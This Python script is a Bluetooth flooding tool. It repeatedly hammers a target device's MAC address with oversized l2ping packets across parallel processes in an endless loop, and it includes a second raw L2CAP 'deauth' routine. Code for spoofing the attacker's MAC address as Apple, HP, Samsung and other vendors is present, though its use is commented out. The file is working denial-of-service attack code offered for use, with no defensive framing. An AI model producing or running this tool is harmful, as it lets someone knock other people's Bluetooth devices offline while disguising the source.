import subprocess
import multiprocessing
import time
import os
from dotenv import load_dotenv
from rich import print
from rich.console import Console
from utils.macaddress_gen import generate_mac_address
# from macaddress_gen import generate_mac_address

load_dotenv()
TARGET_DEVICE_MAC = os.getenv('TARGET_DEVICE_MAC')
interface = os.getenv('INTERFACES')

console = Console()
max_threads = 10

threads_count = min(multiprocessing.cpu_count(), max_threads)

# [ OUI Numbers for Mac Address ]
SPOOFED_MACS = [
    generate_mac_address("Apple"),
    generate_mac_address("HP"),
    generate_mac_address("Google"),
    generate_mac_address("Samsung"),
    generate_mac_address("Sony"),
    generate_mac_address("LG")
    # Add more MAC addresses here if needed
]

# [ 2x Deauth Method ]
def deauth_Method_1(target_addr, packages_size):
    subprocess.Popen(['l2ping', '-i', 'hci0', '-s', str(packages_size), '-f', target_addr], stdout=subprocess.DEVNULL)
    time.sleep(2)

def deauth_Method_2(target_addr, packages_size):
    import bluetooth

    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bd_addr = (target_addr, bluetooth.L2CAP_PSM_HCI)

    try:
        sock.connect(bd_addr)
        sock.settimeout(10)  # Set a timeout for the deauthentication request

        # Send deauthentication packets
        payload = b'\x01' * packages_size
        sock.send(payload)

        print("Deauthentication request sent successfully.")
    except bluetooth.btcommon.BluetoothError as e:
        print("Failed to send deauthentication request:", str(e))
    finally:
        sock.close()

def change_mac_address(interface, mac_address):
    subprocess.call(['ifconfig', interface, 'down'])
    subprocess.call(['ifconfig', interface, 'hw', 'ether', mac_address])
    subprocess.call(['ifconfig', interface, 'up'])

def _kick_(deauth_func, target_addr, packages_size, threads_count, start_time=1):
    for i in range(start_time, 0, -1):
        console.print(f'[red] :rocket: Starting Deauth attack in {i}')
        time.sleep(1)
        console.clear()
    console.print('[red] :rocket: Starting')

    # spoofed_mac_index = 0
    # [ Spofing Mac Adress during every attack ]
    # for _ in range(threads_count):
    #     spoofed_mac = SPOOFED_MACS[spoofed_mac_index % len(SPOOFED_MACS)]
    #     spoofed_mac_index += 1
    #
    #     change_mac_address(interface, spoofed_mac)
    #     multiprocessing.Process(target=Deauth, args=(target_addr, packages_size)).start()

    with multiprocessing.Pool(processes=threads_count) as pool:
        results = [pool.apply_async(deauth_func, args=(target_addr, packages_size)) for _ in range(threads_count)]
        [result.get() for result in results]

if __name__ == '__main__':
    try:
        while True:
            _kick_(deauth_Method_1, TARGET_DEVICE_MAC, 600, threads_count, 1)
            print("Restarting Attack in 10s")
            time.sleep(10)
    except KeyboardInterrupt:
        time.sleep(0.1)
        console.print('\n[red] :fax: Aborted')
        exit()
